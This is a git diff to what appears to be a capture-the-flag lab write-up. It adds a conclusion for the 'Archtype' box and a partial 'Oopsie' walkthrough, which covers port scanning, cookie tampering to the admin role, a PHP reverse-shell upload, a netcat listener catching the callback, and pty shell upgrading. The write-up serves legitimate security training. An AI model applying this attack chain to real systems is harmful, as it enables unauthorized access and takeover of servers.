@@ -3422,7 +3422,7 @@ Nmap done: 1 IP address (1 host up) scanned in 85.15 seconds
 
 
 ```
-Our scan shows quite a few ports the can be explored. Two of the more interesting ones are port 445 (SMB) and 1433 (MYSQL DB)
+Our scan shows quite a few ports the can be explored. The more interesting ones here are port 445 (SMB) and 1433 (MYSQL DB)
 
 We can start by trying to establish connection using smbclient:
 
@@ -3793,6 +3793,264 @@ C:\Users\Administrator\Desktop> type root.txt
 b91ccec3305e98240082d4474b848528
 ```
 
+
+## Conclusions - Level 1 Archtype
+
+| # | 	Tools 	| Description |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
+| 2 | 	winPEAS   |    	Windows  privilege escalation  |
+| 3 | 	netcat   |    	host listening to establish a reverse shell |  
+| 4 | 	MYSQLCLIENT.PY    |    	Logging into MYSQL database | 
+| 5 | 	PSEXEC.PY    |    	Administrative full shell acess | 
+
+| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
+| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
+| 1 | 	Insecure Password Storage  |    	X |  |  |  |
+
+Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the users credentials from a stored file. We then used those credentials to log into MYSQL, where were able access a command line execution. Using netcat, we were then able to establish a reverse shell in order to find the user flag. We then used winPEAS, where we found the ADMIN credentials. Finally, we used those credentials in PSEXEC.PY in order to have full administrative access and grab the admin flag.
+
+[Table of Contents](#table-of-contents)
+
+
+
+
+
+## Level 2: Oopsie
+
+### Scope
+
+The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:
+
+| # | 	Description 	| Value |
+| :-----------: | :-----------: | :-----------: |
+| 1 | 	IP Address   |    	10.129.9.103   | 
+
+### Enumeration
+
+Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
+
+First we can try to see if we can make contact with the machine with a ping request.
+
+```
+ping {ip address}
+```
+The results from the ping are:
+
+```
+└─$ ping 10.129.9.103 
+
+PING 10.129.9.103 (10.129.9.103) 56(84) bytes of data.
+64 bytes from 10.129.9.103: icmp_seq=1 ttl=63 time=5.90 ms
+64 bytes from 10.129.9.103: icmp_seq=2 ttl=63 time=12.1 ms
+64 bytes from 10.129.9.103: icmp_seq=3 ttl=63 time=11.0 ms
+64 bytes from 10.129.9.103: icmp_seq=4 ttl=63 time=9.80 ms
+
+--- 10.129.9.103 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3004ms
+rtt min/avg/max/mdev = 5.899/9.708/12.137/2.349 ms
+
+```
+As we can see, we made a connection with the host. 
+
+Next, we can try using nmap to see if there are any ports that can be exploited.
+
+```
+nmap -p- --min-rate 3000 -sC -sV {ip address}
+```
+
+Where:
+
+```
+-p-: scans ALL ports
+--min-rate <number>: Send packets no slower than <number> per second
+-sC: equivalent to --script=default
+-sV: probe open ports to determine service/version info
+-O: operating system information
+```
+The results of nmap are:
+
+```
+└─$ sudo nmap -p- --min-rate 3000 -sC -sV -O  10.129.9.103 
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-29 14:42 EDT
+Nmap scan report for 10.129.9.103
+Host is up (0.0092s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
+|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Welcome
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=7/29%OT=22%CT=1%CU=42247%PV=Y%DS=2%DC=I%G=Y%TM=62E42A2
+OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
+OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.37 seconds
+
+```
+Our scan shows exactly two ports the can be explored. Theese ports are represented as  22 (SSH) and 80 (Web Server)
+
+We can start by checking out the web page being hosted:
+
+
+![Screenshot_2022-07-29_16_16_52](https://user-images.githubusercontent.com/59018247/181837140-4d5a929e-2b31-40cf-9a01-a367620e8576.png)
+
+
+We see a pretty typical website, running PHP on the backend. As we scroll down, we notice mention of a potential login page!
+
+
+![Screenshot_2022-07-29_16_18_51](https://user-images.githubusercontent.com/59018247/181837359-f2f2f541-f962-453b-89fc-0d42e6b78d72.png)
+
+Since it appears there is no link access directly from the webpage, we can try running gobuster:
+
+```
+└─$ sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 10.129.9.103
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.9.103
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/29 16:09:39 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 313] [--> http://10.129.9.103/images/]
+/themes               (Status: 301) [Size: 313] [--> http://10.129.9.103/themes/]
+/uploads              (Status: 301) [Size: 314] [--> http://10.129.9.103/uploads/]
+/css                  (Status: 301) [Size: 310] [--> http://10.129.9.103/css/]    
+/js                   (Status: 301) [Size: 309] [--> http://10.129.9.103/js/]     
+/fonts                (Status: 301) [Size: 312] [--> http://10.129.9.103/fonts/]  
+                                                                                  
+===============================================================
+2022/07/29 16:10:59 Finished
+===============================================================
+```
+
+Unfortunatly, Gobuster does not turn up any login results. It does however show ```/uploads```, which is not viewable with our current set of permissions.
+
+Another idea would be to try accessing the site using a proxy like burpe suite, to see if we can uncover any more information:
+
+
+![Screenshot_2022-07-29_16_25_26](https://user-images.githubusercontent.com/59018247/181838167-fa262a86-10bb-447c-8bbf-626a9b990876.png)
+
+When using a proxy to launch the site, we notice a get request from the url ```/cdn-cgi/login/script.js```.
+
+We can try to append this url into the browser:
+
+
+![Screenshot_2022-07-29_16_28_50](https://user-images.githubusercontent.com/59018247/181838565-b0994c8e-bf21-4430-84ff-120f8e9cdd83.png)
+
+
+It looks like a success! We can try the login as guest option:
+
+
+![Screenshot_2022-07-29_16_30_58](https://user-images.githubusercontent.com/59018247/181838866-e75ec7d5-2c81-44a0-8d6c-48ba51fb761a.png)
+
+
+We see two interesting pieces of information:
+
+ 1. In Burp Suite we see cookie information ```Cookie: user=2233; role=guest```
+ 2. On the website we see the user guess idea is also that same number, along with the url at the top mentions ```id=2```
+
+We can try to alter the URL in order to possibly change account IDS:
+
+![Screenshot_2022-07-29_16_34_19](https://user-images.githubusercontent.com/59018247/181839286-3b958c13-907a-4534-99c1-ecd9366fac07.png)
+
+Doing so revealed sensitive admin credentials! We can now use that access ID in burp suite to alter how guest ID cookie: 
+
+```
+Cookie: user=34322; role=admin
+```
+
+Modifying the information in the proxy has given us access to the uploads page.
+
+![Screenshot_2022-07-29_16_37_46](https://user-images.githubusercontent.com/59018247/181839701-25ccdf62-bb17-4254-a7ff-c00df40972fd.png)
+
+Since we noticed earlier the backend was running on PHP, we can try to force a file upload containing PHP script that will grant us a reverse shell. We can use php-reverse-shell which comes pre installed on Kali:
+
+![Screenshot_2022-07-29_16_59_15](https://user-images.githubusercontent.com/59018247/181842269-4526c863-8ca5-4f19-a598-dfdd7928d8f0.png)
+
+
+Since we have the payload ready, we can try to see if it uploads:
+
+
+![Screenshot_2022-07-29_16_49_05](https://user-images.githubusercontent.com/59018247/181841040-fceff3e3-3947-46dd-84c6-35b8394e64a4.png)
+
+It looks like it was a success! If we remember earlier, we noticed there was a /uploads directory they were found using gobuster. We can see if that was the location where the payload ended up.
+
+First, let's run netcat on our machine to listen:
+
+```
+└─$ nc -lvnp 1333  
+
+listening on [any] 1333 ...
+```
+
+Nest, we can try accessing the file through the browser:
+
+```
+http://10.129.9.103/uploads/php-reverse-shell.php
+```
+On our listener it appears to be a success!
+
+```
+connect to [10.10.14.136] from (UNKNOWN) [10.129.9.103] 49474
+Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 21:01:17 up  2:36,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+```
+
+Since this is a linux server, we can use this opportunity to get a full shell:
+
+```
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+www-data@oopsie:/$ 
+
+```
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
 
 ## Conclusions - Level 1 Archtype
 
